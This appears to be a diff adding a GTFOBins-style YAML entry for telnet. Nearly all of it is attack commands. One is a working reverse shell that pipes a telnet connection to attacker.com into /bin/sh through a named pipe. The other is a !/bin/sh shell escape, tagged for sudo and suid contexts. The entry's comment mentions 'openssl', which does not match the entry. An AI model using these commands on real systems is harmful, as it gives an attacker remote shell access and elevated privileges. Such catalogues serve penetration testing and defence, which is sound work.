@@ -1,0 +1,23 @@
+---
+functions:
+  reverse-shell:
+  - code: |-
+      mkfifo /path/to/temp-socket
+      telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+    comment: |-
+      The shell process is not spawn by `openssl`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    tty: false
+  shell:
+  - code: |-
+      telnet
+      !/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
